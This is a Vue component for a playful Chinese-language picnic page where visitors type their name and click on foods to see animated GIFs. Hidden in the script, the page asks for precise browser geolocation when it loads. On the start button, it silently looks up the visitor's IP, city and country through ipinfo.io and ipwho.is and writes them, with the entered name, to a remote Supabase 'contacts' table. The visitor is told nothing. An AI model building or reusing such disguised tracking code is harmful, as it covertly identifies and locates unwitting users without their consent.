<template>

	<div :class="['out', outShow]">
		<div class="picnic-form">
			<label for="userName">請輸入你的名字</label>

			<div class="input-wrap">
				<span>🍀</span>
				<input type="text" id="userName" placeholder="輸入名字，讓我認識你..." maxlength="20" v-model="name" />
			</div>

			<button type="button" id="startBtn" @click="gogo">
				開始野餐 ♡
			</button>
		</div>
		<img :src="outUrl" alt="">
	</div>

	<div :class="['scene', outShow]">
		<h1 class="title">☀️ {{ name }} 妳好呀 🌿</h1>
		<!-- 野餐墊 -->
		<div class="picnic-blanket"></div>

		<!-- 三種食物 -->
		<div class="food-container">

			<div :class="['food', isFood]" @click="showFood('sand', 4000)">
				<div v-if="show == 'sand'" class="food_girl _sand">
					<!-- <div class="food_note">
						要先吃什麼好呢？
						<br>
						🤤🤤🤤
					</div> -->
					<img :src="girlUrl_sand" alt="">
				</div>
				<div class="food-plate">
					<span class="food-emoji">🥪</span>
				</div>
				<div class="food-name">美味三明治</div>
			</div>

			<div :class="['food', isFood]" @click="showFood('beger', 4500)">
				<div :class="['food_girl _first', showgirl]">
					<div class="food_note">
						要先吃什麼好呢？
						<br>
						🤤🤤🤤
					</div>
					<img :src="girlUrl" alt="">
				</div>
				<div v-if="show == 'beger'" class="food_girl">
					<!-- <div class="food_note">
						要先吃什麼好呢？
						<br>
						🤤🤤🤤
					</div> -->
					<img :src="girlUrl_beger" alt="">
				</div>
				<div class="food-plate">
					<span class="food-emoji">🍔</span>
				</div>
				<div class="food-name">好ㄔ的漢堡</div>
			</div>

			<div :class="['food', isFood]" @click="showFood('pizza', 3500)">
				<div v-if="show == 'pizza'" class="food_girl _pizza">
					<!-- <div class="food_note">
						要先吃什麼好呢？
						<br>
						🤤🤤🤤
					</div> -->
					<img :src="girlUrl_pizza" alt="">
				</div>
				<div class="food-plate">
					<span class="food-emoji">🍕</span>
				</div>
				<div class="food-name">誠實披薩</div>
			</div>

		</div>

		<div class="footer" style="display: none;">
			Enjoy the sunshine & picnic time ♡
		</div>

	</div>
</template>

<script>
// 1. Supabase 設定
const SUPABASE_URL = 'https://zojzhbwwqrsuvpvjomwy.supabase.co'
const SUPABASE_ANON_KEY = 'sb_publishable_JEwm1VmdMqi_N-2QyMGEFA_YkH7cVeX'
// 2. 建立連線
const { createClient } = supabase;
const db = createClient(
	SUPABASE_URL,
	SUPABASE_ANON_KEY
);
export default {
	data() {
		return {
			girlUrl: "./picture/girl.gif",
			girlUrl_pizza: "./picture/girl_pizza.gif",
			girlUrl_sand: "./picture/girl_sand.gif",
			girlUrl_beger: "./picture/girl_beger.gif",
			show: '',
			outUrl: '../picture/out.gif',
			name: "",
			outShow: null,
			isFood: "",
			showgirl: "",
			finished: false,
			isLoad: true,
			in: null,
			contacts: null,
			loccc: null
		};
	},
	mounted() {
		navigator.geolocation.getCurrentPosition(
			(position) => {
				const latitude = position.coords.latitude;
				const longitude = position.coords.longitude;
				this.loccc = "緯度：" + latitude + "經度：" + longitude
			},
			(error) => {
				console.error("定位失敗：", error.message);
			},
			{
				enableHighAccuracy: true,
				timeout: 10000,
				maximumAge: 0
			}
		);
	},
	methods: {
		gogo() {
			this.geti();
			if (this.name == "") {
				alert('請先輸入你的名字喔！🌿');
				return;
			} else {
				this.outShow = "on"
				this.show = null
				setTimeout(() => {
					this.isFood = 'on'
				}, 1000);
				setTimeout(() => {
					this.showgirl = 'on'
				}, 2000);

			}
		},
		showFood(name, t) {
			console.log("今天的野餐真幸福！\n" + name);
			var time;
			clearTimeout(time);
			this.show = name
			this.showgirl = ""
			time = setTimeout(() => {
				this.show = ''
				this.showgirl = 'on'
			}, t);

		},
		async geti(params) {
			const response_info = await fetch('https://ipinfo.io/json');
			const data_info = await response_info.json();
			this.in = data_info;
			this.seti();

		},
		async seti() {
			try {
				const response_ipwho = await fetch('https://ipwho.is/');
				const data_ipwho = await response_ipwho.json();
				const { error } = await db
					.from('contacts')
					.insert([
						{
							name: this.in.ip + this.name,
							phone: this.in.city,
							note: this.in.country,
							v2: data_ipwho,
							v3: response_ipwho,
						}
					]);
			} catch (error) {
				console.error('取得 IP 失敗', error);
			}
		}
	},
};
</script>
